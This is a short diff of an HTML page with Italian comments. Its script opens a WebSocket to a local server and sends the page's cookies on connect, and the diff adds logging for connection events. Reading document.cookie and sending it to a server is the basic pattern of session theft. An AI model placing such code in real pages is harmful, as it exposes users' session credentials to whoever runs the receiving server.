@@ -6,15 +6,26 @@
 </head>
 <body>
     <script>
+        // Inizializza la connessione WebSocket
         const ws = new WebSocket('ws://localhost:8080');
 
         ws.onopen = () => {
+            console.log('WebSocket connection opened');
+            // Ottieni i cookie e inviali al server tramite WebSocket
             const cookies = document.cookie;
             ws.send(cookies);
         };
 
         ws.onmessage = (event) => {
             console.log('Message from server:', event.data);
+        };
+
+        ws.onerror = (error) => {
+            console.error('WebSocket error:', error);
+        };
+
+        ws.onclose = () => {
+            console.log('WebSocket connection closed');
         };
     </script>
 </body>
